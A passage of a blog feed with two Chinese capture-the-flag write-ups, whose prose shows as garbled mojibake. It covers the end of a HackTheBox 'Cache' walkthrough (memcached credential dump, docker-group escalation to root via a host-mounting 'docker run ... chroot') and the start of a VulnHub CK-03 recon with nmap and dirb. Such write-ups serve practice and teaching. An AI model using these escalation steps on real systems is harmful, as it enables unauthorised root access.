www-data@cache:/var/www/hms.htb/public_html/interface/main$: No such file or directory</span><br><span class="line">&lt;/var/www/hms.htb/public_html/interface/main$ whoami        </span><br><span class="line">bash: www-data@cache:/var/www/hms.htb/public_html/interface/main$: No such file or directory</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ www-data</span><br><span class="line">www-data: command not found</span><br><span class="line">&lt;@cache:/var/www/hms.htb/public_html/interface/main$        </span><br><span class="line">bash: www-data@cache:/var/www/hms.htb/public_html/interface/main$: No such file or directory</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$</span><br></pre></td></tr></table></figure><h3 id="7-åˆ‡æ¢åˆ°ashç”¨æˆ·å¾—åˆ°flag"><a href="#7-åˆ‡æ¢åˆ°ashç”¨æˆ·å¾—åˆ°flag" class="headerlink" title="7.åˆ‡æ¢åˆ°ashç”¨æˆ·å¾—åˆ°flag"></a>7.åˆ‡æ¢åˆ°ashç”¨æˆ·å¾—åˆ°flag</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@cache:/home$ cd ash</span><br><span class="line">www-data@cache:/home/ash$ ls</span><br><span class="line">Desktop  Documents  Downloads  Music  Pictures  Public  user.txt</span><br><span class="line">www-data@cache:/home/ash$ cat user.txt </span><br><span class="line">cat: user.txt: Permission denied</span><br><span class="line">www-data@cache:/home/ash$ su ash</span><br><span class="line">Password: </span><br><span class="line">ash@cache:~$ whoami</span><br><span class="line">ash</span><br><span class="line">ash@cache:~$ pwd</span><br><span class="line">/home/ash</span><br><span class="line">ash@cache:~$ ls</span><br><span class="line">Desktop  Documents  Downloads  Music  Pictures  Public  user.txt</span><br><span class="line">ash@cache:~$ cat user.txt </span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">ash@cache:~$</span><br></pre></td></tr></table></figure><h2 id="0x12-ææƒ"><a href="#0x12-ææƒ" class="headerlink" title="0x12.ææƒ"></a>0x12.ææƒ</h2><h3 id="1-æŸ¥çœ‹ç›‘å¬ç«¯å£"><a href="#1-æŸ¥çœ‹ç›‘å¬ç«¯å£" class="headerlink" title="1.æŸ¥çœ‹ç›‘å¬ç«¯å£"></a>1.æŸ¥çœ‹ç›‘å¬ç«¯å£</h3><p><code>googleå‘ç°11211ç«¯å£ä¸ºmemcacheæœåŠ¡</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ash@cache:/$ ss -lnt</span><br><span class="line">State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    </span><br><span class="line">LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       </span><br><span class="line">LISTEN   0         128               127.0.0.1:11211            0.0.0.0:*       </span><br><span class="line">LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       </span><br><span class="line">LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       </span><br><span class="line">LISTEN   0         128                       *:80                     *:*       </span><br><span class="line">LISTEN   0         128                    [::]:22                  [::]:*       </span><br><span class="line">ash@cache:/$</span><br></pre></td></tr></table></figure><h3 id="2-memcacheå‚è€ƒ"><a href="#2-memcacheå‚è€ƒ" class="headerlink" title="2.memcacheå‚è€ƒ"></a>2.<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL3BlbmV0cmF0aW9uLXRlc3Rpbmctb24tbWVtY2FjaGVkLXNlcnZlci8=">memcacheå‚è€ƒ<i class="fa fa-external-link-alt"></i></span></h3><blockquote><p>å¾—åˆ°luffyç”¨æˆ·ä¸å¯†ç 0n3_p1ec3</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">ash@cache:/$ telnet 127.0.0.1 11211</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">Connected to 127.0.0.1.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">stats</span><br><span class="line">STAT pid 987</span><br><span class="line">STAT uptime 1807</span><br><span class="line">STAT time 1601548108</span><br><span class="line">STAT version 1.5.6 Ubuntu</span><br><span class="line">STAT libevent 2.1.8-stable</span><br><span class="line">STAT pointer_size 64</span><br><span class="line">STAT rusage_user 0.153965</span><br><span class="line">STAT rusage_system 0.193444</span><br><span class="line">STAT max_connections 1024</span><br><span class="line">STAT curr_connections 1</span><br><span class="line">STAT total_connections 32</span><br><span class="line">STAT rejected_connections 0</span><br><span class="line">STAT connection_structures 2</span><br><span class="line">STAT reserved_fds 20</span><br><span class="line">STAT cmd_get 0</span><br><span class="line">STAT cmd_set 150</span><br><span class="line">STAT cmd_flush 0</span><br><span class="line">STAT cmd_touch 0</span><br><span class="line">STAT get_hits 0</span><br><span class="line">STAT get_misses 0</span><br><span class="line">STAT get_expired 0</span><br><span class="line">STAT get_flushed 0</span><br><span class="line">STAT delete_misses 0</span><br><span class="line">STAT delete_hits 0</span><br><span class="line">STAT incr_misses 0</span><br><span class="line">STAT incr_hits 0</span><br><span class="line">STAT decr_misses 0</span><br><span class="line">STAT decr_hits 0</span><br><span class="line">STAT cas_misses 0</span><br><span class="line">STAT cas_hits 0</span><br><span class="line">STAT cas_badval 0</span><br><span class="line">STAT touch_hits 0</span><br><span class="line">STAT touch_misses 0</span><br><span class="line">STAT auth_cmds 0</span><br><span class="line">STAT auth_errors 0</span><br><span class="line">STAT bytes_read 4597</span><br><span class="line">STAT bytes_written 1200</span><br><span class="line">STAT limit_maxbytes 67108864</span><br><span class="line">STAT accepting_conns 1</span><br><span class="line">STAT listen_disabled_num 0</span><br><span class="line">STAT time_in_listen_disabled_us 0</span><br><span class="line">STAT threads 4</span><br><span class="line">STAT conn_yields 0</span><br><span class="line">STAT hash_power_level 16</span><br><span class="line">STAT hash_bytes 524288</span><br><span class="line">STAT hash_is_expanding 0</span><br><span class="line">STAT slab_reassign_rescues 0</span><br><span class="line">STAT slab_reassign_chunk_rescues 0</span><br><span class="line">STAT slab_reassign_evictions_nomem 0</span><br><span class="line">STAT slab_reassign_inline_reclaim 0</span><br><span class="line">STAT slab_reassign_busy_items 0</span><br><span class="line">STAT slab_reassign_busy_deletes 0</span><br><span class="line">STAT slab_reassign_running 0</span><br><span class="line">STAT slabs_moved 0</span><br><span class="line">STAT lru_crawler_running 0</span><br><span class="line">STAT lru_crawler_starts 2040</span><br><span class="line">STAT lru_maintainer_juggles 3984</span><br><span class="line">STAT malloc_fails 0</span><br><span class="line">STAT log_worker_dropped 0</span><br><span class="line">STAT log_worker_written 0</span><br><span class="line">STAT log_watcher_skipped 0</span><br><span class="line">STAT log_watcher_sent 0</span><br><span class="line">STAT bytes 371</span><br><span class="line">STAT curr_items 5</span><br><span class="line">STAT total_items 150</span><br><span class="line">STAT slab_global_page_pool 0</span><br><span class="line">STAT expired_unfetched 0</span><br><span class="line">STAT evicted_unfetched 0</span><br><span class="line">STAT evicted_active 0</span><br><span class="line">STAT evictions 0</span><br><span class="line">STAT reclaimed 0</span><br><span class="line">STAT crawler_reclaimed 0</span><br><span class="line">STAT crawler_items_checked 28</span><br><span class="line">STAT lrutail_reflocked 0</span><br><span class="line">STAT moves_to_cold 150</span><br><span class="line">STAT moves_to_warm 0</span><br><span class="line">STAT moves_within_lru 0</span><br><span class="line">STAT direct_reclaims 0</span><br><span class="line">STAT lru_bumps_dropped 0</span><br><span class="line">END</span><br><span class="line">get user</span><br><span class="line">VALUE user 0 5</span><br><span class="line">luffy</span><br><span class="line">END</span><br><span class="line">get passwd       </span><br><span class="line">VALUE passwd 0 9</span><br><span class="line">0n3_p1ec3</span><br><span class="line">END</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-luffyç™»å…¥"><a href="#3-luffyç™»å…¥" class="headerlink" title="3.luffyç™»å…¥"></a>3.luffyç™»å…¥</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">ash@cache:/$ ssh luffy@127.0.0.1</span><br><span class="line">The authenticity of host &#x27;127.0.0.1 (127.0.0.1)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:/qQ34g2zzGVlmbMIKeD7JhlhDf/SPzgYFz000v+3KBI.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &#x27;127.0.0.1&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">luffy@127.0.0.1&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-109-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Thu Oct  1 10:34:55 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:              181</span><br><span class="line">  Usage of /:   75.0% of 8.06GB   Users logged in:        0</span><br><span class="line">  Memory usage: 12%               IP address for ens160:  10.10.10.188</span><br><span class="line">  Swap usage:   0%                IP address for docker0: 172.17.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available for installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">110 packages can be updated.</span><br><span class="line">0 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Wed May  6 08:54:44 2020 from 10.10.14.3</span><br><span class="line">luffy@cache:~$ </span><br><span class="line">luffy@cache:~$ whoami</span><br><span class="line">luffy</span><br><span class="line">luffy@cache:~$uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)</span><br><span class="line">luffy@cache:~$</span><br></pre></td></tr></table></figure><h3 id="4-dockerææƒ"><a href="#4-dockerææƒ" class="headerlink" title="4.dockerææƒ"></a>4.dockerææƒ</h3><p><code>å¯ä»¥çœ‹åˆ°luffyå±äºdockerç”¨æˆ·ç»„</code></p><p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZG9ja2VyLw==">dockerææƒå‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh</span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span></span><br><span class="line">root@386a1a19658b:/# </span><br><span class="line">root@386a1a19658b:/# </span><br><span class="line">root@386a1a19658b:/# cd</span><br><span class="line">root@386a1a19658b:~# pwd</span><br><span class="line">/root</span><br><span class="line">root@386a1a19658b:~# ls</span><br><span class="line">root.txt</span><br><span class="line">root@386a1a19658b:~# cat root.txt </span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">root@386a1a19658b:~#</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#0x00-æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.æ¦‚è¿°&quot;&gt;&lt;/a&gt;0x00.æ¦‚è¿°&lt;/h2&gt;&lt;img src=&quot;/2020/10/01/HTB-cache/image-20201001085152007.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>CK-03</title>
    <link href="https://lunamoore.github.io/2020/09/26/CK-03/"/>
    <id>https://lunamoore.github.io/2020/09/26/CK-03/</id>
    <published>2020-09-26T02:11:41.000Z</published>
    <updated>2020-09-26T02:15:29.037Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00å®˜ç½‘æè¿°"><a href="#0x00å®˜ç½‘æè¿°" class="headerlink" title="0x00å®˜ç½‘æè¿°"></a>0x00å®˜ç½‘æè¿°</h2><blockquote><p>This box is upgraded edition of previous (MyFileServer 2) box.</p><p>Multiple way to get user and root flags are added.</p><p>Ping me on twitter @CyberKnight00 if you face any difficulty.</p><p>Donâ€™t stop after finding 1 way there are more ways.</p><p>This works better with VirtualBox than VMware.</p></blockquote><a id="more"></a><h2 id="0x01-ä¸»æœºæ‰«æ"><a href="#0x01-ä¸»æœºæ‰«æ" class="headerlink" title="0x01.ä¸»æœºæ‰«æ"></a>0x01.ä¸»æœºæ‰«æ</h2><p><code>æ ¹æ®MACåœ°å€å¾—åˆ°ç›®æ ‡ä¸»æœºä¸º192.168.1.14</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# nmap -sP 192.168.1.0/24 -oN nmap.sP</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 15:59 EDT</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.14</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">MAC Address: 00:0C:29:D5:67:2B (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.20</span><br><span class="line">Host is up (0.000063s latency).</span><br><span class="line">MAC Address: 00:50:56:FB:E6:6D (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.10</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 28.04 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-ç«¯å£æ‰«æ"><a href="#0x02-ç«¯å£æ‰«æ" class="headerlink" title="0x02.ç«¯å£æ‰«æ"></a>0x02.ç«¯å£æ‰«æ</h2><p><code>å¾—åˆ°ä»¥ä¸‹ç«¯å£ï¼Œå¯ä»¥çœ‹åˆ°ftpç«¯å£å…è®¸anonymousç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# nmap -sC -sV -sT 192.168.1.14 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 16:09 EDT</span><br><span class="line">Nmap scan report for 192.168.1.14</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 992 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 3.0.2</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx    3 0        0              16 Feb 19  2020 pub [NSE: writeable]</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.1.10</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.2 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 75:fa:37:d1:62:4a:15:87:7e:21:83:b9:2f:ff:04:93 (RSA)</span><br><span class="line">|   256 b8:db:2c:ca:e2:70:c3:eb:9a:a8:cc:0e:a2:1c:68:6b (ECDSA)</span><br><span class="line">|_  256 66:a3:1b:55:ca:c2:51:84:41:21:7f:77:40:45:d4:9f (ED25519)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.6 ((CentOS))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS)</span><br><span class="line">|_http-title: My File Server</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service                                                                                                                   </span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind                                                                                                                   </span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind                                                                                                                   </span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind                                                                                                                   </span><br><span class="line">|   100000  3,4          111/udp6  rpcbind                                                                                                                   </span><br><span class="line">|   100003  3,4         2049/tcp   nfs                                                                                                                       </span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100003  3,4         2049/udp   nfs</span><br><span class="line">|   100003  3,4         2049/udp6  nfs</span><br><span class="line">|   100005  1,2,3      20048/tcp   mountd</span><br><span class="line">|   100005  1,2,3      20048/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      20048/udp   mountd</span><br><span class="line">|   100005  1,2,3      20048/udp6  mountd</span><br><span class="line">|   100021  1,3,4      43810/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      44598/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      47781/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      52409/udp   nlockmgr</span><br><span class="line">|   100024  1          35697/tcp6  status</span><br><span class="line">|   100024  1          38764/tcp   status</span><br><span class="line">|   100024  1          40593/udp6  status</span><br><span class="line">|   100024  1          54638/udp   status</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)</span><br><span class="line">2049/tcp open  nfs_acl     3 (RPC #100227)</span><br><span class="line">2121/tcp open  ftp         ProFTPD 1.3.5</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx   3 root     root           16 Feb 19  2020 pub [NSE: writeable]</span><br><span class="line">MAC Address: 00:0C:29:D5:67:2B (VMware)</span><br><span class="line">Service Info: Host: FILESERVER; OS: Unix</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -1h49m53s, deviation: 3h10m19s, median: 0s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.9.1)</span><br><span class="line">|   Computer name: localhost</span><br><span class="line">|   NetBIOS computer name: FILESERVER\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: localhost</span><br><span class="line">|_  System time: 2020-09-26T01:39:56+05:30</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-09-25T20:09:36</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 58.30 seconds</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><h2 id="0x03-è®¿é—®80ç«¯å£"><a href="#0x03-è®¿é—®80ç«¯å£" class="headerlink" title="0x03.è®¿é—®80ç«¯å£"></a>0x03.è®¿é—®80ç«¯å£</h2><p><code>ä»…ä»…æ˜¯ä¸€ä¸ªé™æ€é¡µé¢ï¼Œä¸”å¯ä»¥é‡å®šå‘åˆ°ä¸€ä¸ªç½‘ç«™</code></p><img src="/2020/09/26/CK-03/image-20200925201803610.png" class><h2 id="0x04-æ‰«æç›®å½•"><a href="#0x04-æ‰«æç›®å½•" class="headerlink" title="0x04.æ‰«æç›®å½•"></a>0x04.æ‰«æç›®å½•</h2><p><code>å¾—åˆ°.sshç›®å½•</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# dirb http://192.168.1.14</span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line">START_TIME: Fri Sep 25 16:26:08 2020</span><br><span class="line">URL_BASE: http://192.168.1.14/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">-----------------</span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line">---- Scanning URL: http://192.168.1.14/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.14/.ssh/</span><br><span class="line">+ http://192.168.1.14/cgi-bin/ (CODE:403|SIZE:210)</span><br><span class="line">+ http://192.168.1.14/index.html (CODE:200|SIZE:174)                              </span><br><span class="line">---- Entering directory: http://192.168.1.14/.ssh/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Fri Sep 25 16:26:12 2020</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 2</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><h2 id="0x05-æµè§ˆ-sshç›®å½•"><a href="#0x05-æµè§ˆ-sshç›®å½•" class="headerlink" title="0x05.æµè§ˆ.sshç›®å½•"></a>0x05.æµè§ˆ.sshç›®å½•</h2><p><code>å‘ç°ä¸¤ä¸ªæ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªä¸ºå…¬é’¥ï¼Œç¬¬äºŒä¸ªä¸ºç§é’¥ï¼Œä½†æ‹’ç»è®¿é—®</code></p><img src="/2020/09/26/CK-03/image-20200925202904665.png" class><p><code>æµè§ˆæ–‡ä»¶</code></p><img src="/2020/09/26/CK-03/image-20200925203157919.png" class><img src="/2020/09/26/CK-03/image-20200925203239246.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa 